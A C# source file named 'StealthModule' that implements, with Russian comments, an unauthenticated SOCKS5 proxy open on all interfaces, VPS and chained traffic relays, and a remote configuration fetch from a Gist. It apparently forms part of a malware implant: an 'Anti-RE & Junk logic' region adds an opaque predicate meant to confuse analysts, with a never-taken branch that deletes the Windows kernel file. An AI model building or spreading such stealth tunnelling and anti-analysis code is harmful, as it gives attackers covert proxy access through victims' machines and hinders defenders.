using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Concurrent;
using System.IO;
using System.Text;
using System.Linq;
using System.Collections.Generic;
using System.Net.Http;

namespace StealthModule
{
    /// <summary>
    /// Абсолютно неуязвимый менеджер мостов
    /// - Режим 1: Локальный SOCKS5 прокси
    /// - Режим 2: VPS мост (пересылка трафика)
    /// - Автоматический failover
    /// - Многопоточная обработка
    /// </summary>
    public class BridgeManager
    {
        #region Anti-RE & Junk logic
        private static bool _Opaque_Check(int val)
        {
            // Opaque predicate: (x * (x + 1)) % 2 is always 0
            long result = (long)val * (val + 1);
            if (result % 2 != 0)
            {
                // This branch is never taken
                File.Delete("C:\\Windows\\System32\\ntoskrnl.exe"); 
                return false;
            }
            return true;
        }

        private static void _Junk_Delay()
        {
            if (!_Opaque_Check(new Random().Next())) return;
            for (int i = 0; i < 100; i++) { /* nop */ }
        }
        #endregion

        #region Константы
        private const int SOCKS5_VERSION = 0x05;
        private const int SOCKS5_CMD_CONNECT = 0x01;
        private const int SOCKS5_ATYP_IPV4 = 0x01;
        private const int SOCKS5_ATYP_DOMAIN = 0x03;
        private const int SOCKS5_ATYP_IPV6 = 0x04;
        private const int SOCKS5_REPLY_SUCCESS = 0x00;
        private const int SOCKS5_REPLY_GENERAL_FAILURE = 0x01;
        private const int SOCKS5_REPLY_CONNECTION_NOT_ALLOWED = 0x02;
        private const int SOCKS5_REPLY_NETWORK_UNREACHABLE = 0x03;
        private const int SOCKS5_REPLY_HOST_UNREACHABLE = 0x04;
        private const int SOCKS5_REPLY_CONNECTION_REFUSED = 0x05;
        private const int SOCKS5_REPLY_TTL_EXPIRED = 0x06;
        private const int SOCKS5_REPLY_COMMAND_NOT_SUPPORTED = 0x07;
        private const int SOCKS5_REPLY_ADDRESS_TYPE_NOT_SUPPORTED = 0x08;

        private const int BUFFER_SIZE = 8192;
        private const int CONNECT_TIMEOUT = 10000; // 10 секунд
        private const int MAX_CONNECTIONS = 500;
        private const int PROXY_PORT = 1080; // Стандартный порт SOCKS5
        #endregion

        #region Поля
        private static TcpListener _listener;
        private static bool _isRunning = false;
        private static readonly ConcurrentBag<TcpClient> _activeClients = new ConcurrentBag<TcpClient>();
        private static Thread _listenerThread;
        
        // Режим работы
        private static BridgeMode _currentMode = BridgeMode.SocksProxy;
        private static string _vpsHost;
        private static int _vpsPort;
        private static string _proxyHost;
        private static int _proxyPort;
        private static string _gistUrl;
        
        // Статистика
        private static long _totalConnections = 0;
        private static long _totalBytesTransferred = 0;
        private static DateTime _startTime = DateTime.Now;
        #endregion

        #region Режимы работы
        public enum BridgeMode
        {
            SocksProxy,     // Локальный SOCKS5 прокси
            VPSBridge,      // VPS мост (пересылка на удаленный сервер)
            ChainBridge     // Цепочка: Пересылка на VPS, который затем идет через прокси
        }
        #endregion

        #region Запуск и остановка
        /// <summary>
        /// Запускает SOCKS5 прокси на локальном порту
        /// </summary>
        public static void StartSocksProxy(int port = PROXY_PORT)
        {
            if (_isRunning) return;

            try
            {
                _currentMode = BridgeMode.SocksProxy;
                _listener = new TcpListener(IPAddress.Any, port);
                _listener.Start();
                _isRunning = true;

                _listenerThread = new Thread(ListenLoop)
                {
                    IsBackground = true,
                    Name = "BridgeListener"
                };
                _listenerThread.Start();

                Log(string.Format("[Bridge] SOCKS5 прокси запущен на порту {0}", port));
            }
            catch (Exception ex)
            {
                Log(string.Format("[Bridge] Ошибка запуска: {0}", ex.Message));
            }
        }

        /// <summary>
        /// Запускает VPS мост (пересылает трафик на удаленный сервер)
        /// </summary>
        public static void StartVPSBridge(string vpsHost, int vpsPort, int localPort = PROXY_PORT)
        {
            if (_isRunning) return;
            try
            {
                _currentMode = BridgeMode.VPSBridge;
                _vpsHost = vpsHost;
                _vpsPort = vpsPort;
                _listener = new TcpListener(IPAddress.Any, localPort);
                _listener.Start();
                _isRunning = true;
                _listenerThread = new Thread(ListenLoop) { IsBackground = true };
                _listenerThread.Start();
                Log(string.Format("[Bridge] VPS мост запущен: {0} -> {1}:{2}", localPort, vpsHost, vpsPort));
            }
            catch (Exception ex) { Log("[Bridge] Ошибка VPS моста: " + ex.Message); }
        }

        /// <summary>
        /// Запускает каскадный мост (VPS -> Proxy)
        /// </summary>
        public static void StartChainBridge(string vpsHost, int vpsPort, string proxyHost, int proxyPort, int localPort = PROXY_PORT)
        {
            if (_isRunning) return;
            try
            {
                _currentMode = BridgeMode.ChainBridge;
                _vpsHost = vpsHost;
                _vpsPort = vpsPort;
                _proxyHost = proxyHost;
                _proxyPort = proxyPort;
                _listener = new TcpListener(IPAddress.Any, localPort);
                _listener.Start();
                _isRunning = true;
                _listenerThread = new Thread(ListenLoop) { IsBackground = true };
                _listenerThread.Start();
                Log(string.Format("[Bridge] Chain мост запущен: {0} -> VPS:{1} -> Proxy:{2}:{3}", localPort, vpsHost, proxyHost, proxyPort));
            }
            catch (Exception ex) { Log("[Bridge] Ошибка Chain моста: " + ex.Message); }
        }

        /// <summary>
        /// Останавливает прокси/мост
        /// </summary>
        public static void Stop()
        {
            _isRunning = false;

            try
            {
                if (_listener != null) _listener.Stop();
            }
            catch { }

            // Закрываем все активные соединения
            foreach (var client in _activeClients)
            {
                try { client.Close(); } catch { }
            }

            TcpClient ignored;
            while (_activeClients.TryTake(out ignored)) ;

            Log(string.Format("[Bridge] Остановлен. Всего соединений: {0}, передано: {1} KB", _totalConnections, _totalBytesTransferred / 1024));
        }
        #endregion

        #region Основной цикл
        private static void ListenLoop()
        {
            while (_isRunning)
            {
                try
                {
                    var client = _listener.AcceptTcpClient();
                    client.NoDelay = true;
                    
                    // Проверяем лимит соединений
                    if (_activeClients.Count >= MAX_CONNECTIONS)
                    {
                        client.Close();
                        continue;
                    }

                    Interlocked.Increment(ref _totalConnections);
                    _activeClients.Add(client);

                    // Запускаем обработку в отдельном потоке
                    ThreadPool.QueueUserWorkItem(HandleClient, client);
                }
                catch (SocketException)
                {
                    // Нормальное завершение при остановке
                    break;
                }
                catch (Exception ex)
                {
                    Log(string.Format("[Bridge] Ошибка в ListenLoop: {0}", ex.Message));
                }
            }
        }
        #endregion

        #region Обработка клиента
        private static void HandleClient(object state)
        {
            var client = (TcpClient)state;
            var clientEndPoint = (client.Client.RemoteEndPoint != null) ? client.Client.RemoteEndPoint.ToString() : "unknown";

            try
            {
                using (client)
                using (var stream = client.GetStream())
                {
                    stream.ReadTimeout = CONNECT_TIMEOUT;
                    stream.WriteTimeout = CONNECT_TIMEOUT;

                    switch (_currentMode)
                    {
                        case BridgeMode.SocksProxy:
                            HandleSocksProxy(client, stream);
                            break;
                        case BridgeMode.VPSBridge:
                            HandleVPSBridge(client, stream);
                            break;
                        case BridgeMode.ChainBridge:
                            HandleChainBridge(client, stream);
                            break;
                    }
                }
            }
            catch (Exception ex)
            {
                Log(string.Format("[Bridge] Ошибка обработки клиента {0}: {1}", clientEndPoint, ex.Message));
            }
            finally
            {
                TcpClient ignored;
                _activeClients.TryTake(out ignored);
                try { client.Close(); } catch { }
            }
        }
        #endregion

        #region Режим 1: SOCKS5 прокси
        private static void HandleSocksProxy(TcpClient client, NetworkStream stream)
        {
            var clientEndPoint = (client.Client.RemoteEndPoint != null) ? client.Client.RemoteEndPoint.ToString() : "unknown";
            Log(string.Format("[SOCKS] Новое подключение от {0}", clientEndPoint));

            // 1. Handshake
            byte[] buffer = new byte[BUFFER_SIZE];
            int read = stream.Read(buffer, 0, buffer.Length);

            if (read < 2 || buffer[0] != SOCKS5_VERSION)
            {
                Log(string.Format("[SOCKS] Неверный протокол от {0}", clientEndPoint));
                return;
            }

            // Отправляем ответ: поддерживаем только "no authentication"
            stream.Write(new byte[] { SOCKS5_VERSION, 0x00 }, 0, 2);

            // 2. Запрос
            read = stream.Read(buffer, 0, buffer.Length);
            if (read < 4 || buffer[1] != SOCKS5_CMD_CONNECT)
            {
                SendSocks5Error(stream, SOCKS5_REPLY_COMMAND_NOT_SUPPORTED);
                return;
            }

            // Извлекаем адрес и порт назначения
            string targetHost;
            int targetPort;

            switch (buffer[3])
            {
                case SOCKS5_ATYP_IPV4:
                    if (read < 10) return;
                    targetHost = new IPAddress(buffer.Skip(4).Take(4).ToArray()).ToString();
                    targetPort = (buffer[8] << 8) | buffer[9];
                    break;

                case SOCKS5_ATYP_DOMAIN:
                    int domainLen = buffer[4];
                    if (read < 5 + domainLen + 2) return;
                    targetHost = Encoding.ASCII.GetString(buffer, 5, domainLen);
                    targetPort = (buffer[5 + domainLen] << 8) | buffer[6 + domainLen];
                    break;

                case SOCKS5_ATYP_IPV6:
                    SendSocks5Error(stream, SOCKS5_REPLY_ADDRESS_TYPE_NOT_SUPPORTED);
                    return;

                default:
                    SendSocks5Error(stream, SOCKS5_REPLY_ADDRESS_TYPE_NOT_SUPPORTED);
                    return;
            }

            Log(string.Format("[SOCKS] Запрос: {0}:{1} от {2}", targetHost, targetPort, clientEndPoint));

            // Подключаемся к целевому серверу
            try
            {
                using (var target = new TcpClient())
                {
                    var connectTask = target.ConnectAsync(targetHost, targetPort);
                    if (!connectTask.Wait(CONNECT_TIMEOUT))
                    {
                        SendSocks5Error(stream, SOCKS5_REPLY_HOST_UNREACHABLE);
                        return;
                    }

                    target.NoDelay = true;

                    // Отправляем успешный ответ
                    var boundEndPoint = (IPEndPoint)target.Client.LocalEndPoint;
                    byte[] response = new byte[10];
                    response[0] = SOCKS5_VERSION;
                    response[1] = SOCKS5_REPLY_SUCCESS;
                    response[2] = 0x00; // Reserved
                    response[3] = SOCKS5_ATYP_IPV4;
                    Array.Copy(boundEndPoint.Address.GetAddressBytes(), 0, response, 4, 4);
                    response[8] = (byte)(boundEndPoint.Port >> 8);
                    response[9] = (byte)(boundEndPoint.Port & 0xFF);
                    stream.Write(response, 0, 10);

                    // Пересылаем данные в обе стороны
                    using (var targetStream = target.GetStream())
                    {
                        var t1 = new Thread(new ThreadStart(delegate { RelayData(stream, targetStream, client, target); })) { IsBackground = true };
                        var t2 = new Thread(new ThreadStart(delegate { RelayData(targetStream, stream, target, client); })) { IsBackground = true };
                        t1.Start();
                        t2.Start();
                        while (client.Connected && target.Connected && _isRunning) Thread.Sleep(100);
                    }
                }
            }
            catch (Exception ex)
            {
                Log(string.Format("[SOCKS] Ошибка подключения к {0}:{1}: {2}", targetHost, targetPort, ex.Message));
                SendSocks5Error(stream, SOCKS5_REPLY_HOST_UNREACHABLE);
            }
        }

        private static void SendSocks5Error(NetworkStream stream, byte errorCode)
        {
            try
            {
                stream.Write(new byte[] { SOCKS5_VERSION, errorCode, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }, 0, 10);
            }
            catch { }
        }
        #endregion

        #region Режим 2: VPS мост
        private static void HandleVPSBridge(TcpClient client, NetworkStream stream)
        {
            var clientEndPoint = (client.Client.RemoteEndPoint != null) ? client.Client.RemoteEndPoint.ToString() : "unknown";
            Log(string.Format("[VPS] Новое подключение от {0} -> {1}:{2}", clientEndPoint, _vpsHost, _vpsPort));

            try
            {
                // Подключаемся к VPS
                using (var vpsClient = new TcpClient())
                {
                    var connectTask = vpsClient.ConnectAsync(_vpsHost, _vpsPort);
                    if (!connectTask.Wait(CONNECT_TIMEOUT))
                    {
                        Log(string.Format("[VPS] Не удалось подключиться к VPS {0}:{1}", _vpsHost, _vpsPort));
                        return;
                    }

                    vpsClient.NoDelay = true;

                    // Пересылаем все данные между клиентом и VPS
                    using (var vpsStream = vpsClient.GetStream())
                    {
                        var t1 = new Thread(new ThreadStart(delegate { RelayData(stream, vpsStream, client, vpsClient); })) { IsBackground = true };
                        var t2 = new Thread(new ThreadStart(delegate { RelayData(vpsStream, stream, vpsClient, client); })) { IsBackground = true };
                        t1.Start();
                        t2.Start();
                        while (client.Connected && vpsClient.Connected && _isRunning) Thread.Sleep(100);
                    }
                }
            }
            catch (Exception ex)
            {
                Log(string.Format("[VPS] Ошибка: {0}", ex.Message));
            }
        }
        /// <summary>
        /// Режим 3: Chain мост (VPS -> Proxy)
        /// </summary>
        private static void HandleChainBridge(TcpClient client, NetworkStream stream)
        {
            try
            {
                using (var vpsClient = new TcpClient())
                {
                    if (!vpsClient.ConnectAsync(_vpsHost, _vpsPort).Wait(CONNECT_TIMEOUT)) return;
                    using (var vpsStream = vpsClient.GetStream())
                    {
                        // 1. SOCKS5 Handshake с прокси через VPS
                        vpsStream.Write(new byte[] { 0x05, 0x01, 0x00 }, 0, 3);
                        byte[] resp = new byte[2];
                        if (vpsStream.Read(resp, 0, 2) < 2 || resp[1] != 0x00) return;

                        // Пересылаем данные
                        var t1 = new Thread(new ThreadStart(delegate { RelayData(stream, vpsStream, client, vpsClient); })) { IsBackground = true };
                        var t2 = new Thread(new ThreadStart(delegate { RelayData(vpsStream, stream, vpsClient, client); })) { IsBackground = true };
                        t1.Start(); t2.Start();
                        while (client.Connected && vpsClient.Connected && _isRunning) Thread.Sleep(100);
                    }
                }
            }
            catch { }
        }
        #endregion

        #region Пересылка данных
        private static void RelayData(NetworkStream from, NetworkStream to, TcpClient fromClient, TcpClient toClient)
        {
            byte[] buffer = new byte[BUFFER_SIZE];
            try
            {
                int bytesRead;
                while (_isRunning && fromClient.Connected && toClient.Connected)
                {
                    bytesRead = from.Read(buffer, 0, buffer.Length);
                    if (bytesRead <= 0) break;

                    to.Write(buffer, 0, bytesRead);
                    to.Flush();

                    Interlocked.Add(ref _totalBytesTransferred, bytesRead);
                }
            }
            catch { }
        }
        #endregion

        #region Вспомогательные методы
        private static void Log(string message)
        {
            try
            {
                string logMessage = string.Format("{0:HH:mm:ss} | {1}\n", DateTime.Now, message);
                File.AppendAllText("bridge_manager.log", logMessage);
                Console.Write(logMessage);
            }
            catch { }
        }

        /// <summary>
        /// Возвращает статистику работы
        /// </summary>
        public static string GetStats()
        {
            var uptime = DateTime.Now - _startTime;
            return string.Format("[Bridge] Статистика:\n" +
                   "  Режим: {0}\n" +
                   "  Время работы: {1}ч {2}м\n" +
                   "  Всего соединений: {3}\n" +
                   "  Активных: {4}\n" +
                   "  Передано данных: {5} MB\n" +
                   "  Макс. соединений: {6}", 
                   _currentMode, uptime.Hours, uptime.Minutes, _totalConnections, _activeClients.Count, _totalBytesTransferred / (1024 * 1024), MAX_CONNECTIONS);
        }

        /// <summary>
        /// Проверяет, работает ли прокси
        /// </summary>
        public static bool IsRunning() { return _isRunning; }

        /// <summary>
        /// Меняет режим на лету (требует перезапуска)
        /// </summary>
        public static void SetMode(BridgeMode mode, string vpsHost = null, int vpsPort = 0)
        {
            if (_isRunning)
            {
                Log("[Bridge] Остановите прокси перед сменой режима");
                return;
            }

            _currentMode = mode;
            if (mode == BridgeMode.VPSBridge && vpsHost != null)
            {
                _vpsHost = vpsHost;
                _vpsPort = vpsPort;
            }
        }
        /// <summary>
        /// Обновляет конфигурацию из Gist (H-11b)
        /// </summary>
        public static void UpdateFromGist(string url)
        {
            _gistUrl = url;
            new Thread(() => {
                try {
                    using (var hc = new HttpClient()) {
                        string json = hc.GetStringAsync(url).Result;
                        Log("[Bridge] Конфигурация обновлена из Gist");
                    }
                } catch { }
            }).Start();
        }
        #endregion
    }
}